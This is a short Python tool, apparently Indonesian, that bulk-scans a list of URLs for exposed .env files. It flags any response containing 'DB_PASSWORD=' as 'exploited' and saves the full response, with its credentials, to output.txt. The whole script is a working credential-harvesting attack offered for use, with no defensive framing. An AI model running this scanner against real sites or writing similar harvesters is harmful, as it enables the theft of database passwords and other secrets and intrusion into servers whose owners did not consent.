import requests as mr
import os.path
import os

if os.path.exists('output.txt'):
    banner = """
    $$$$$$$$\ $$\   $$\ $$\    $$\       
    $$  _____|$$$\  $$ |$$ |   $$ |      
    $$ |      $$$$\ $$ |$$ |   $$ |      
    $$$$$\    $$ $$\$$ |\$$\  $$  |      
    $$  __|   $$ \$$$$ | \$$\$$  /       
    $$ |      $$ |\$$$ |  \$$$  /        
$$\ $$$$$$$$\ $$ | \$$ |   \$  /         
\__|\________|\__|  \__|    \_/                  
    """
    print(banner)

    daftar_url = input("""\033[36m
    [+] \033[35mMasukan Daftar URL (gunakan dengan jenis extension) =>: \033[0;0m""")

    daftar_url = open(daftar_url, 'r').readlines()
    daftar_url = [line.replace('\n', '') for line in daftar_url]

    jumlah_terdeteksi = 0
    jumlah_tidak_vulnerable = 0

    for url in daftar_url:
        respon = mr.get(url).text
        if 'DB_PASSWORD=' in respon:
            print('💈 URL  {} Berhasil Exploited 💈\n'.format(url))
            with open('output.txt', 'a') as outfile:
                outfile.write('{} || \n {}\n'.format(url, respon))
            jumlah_terdeteksi += 1
        else:
            jumlah_tidak_vulnerable += 1
            print('💈  {} Error | Not vunerable :| 💈\n'.format(url))

    print('💈  {} \033[36mBerhasil Ter-exploitasi(s) \033[0;0m|| {} \033[35mTidak vunerable(is) \033[0;0m|| 💈'.format(jumlah_terdeteksi,
                                                                                                         jumlah_tidak_vulnerable))
else:
    with open('output.txt', 'w') as f:
        f.write('')
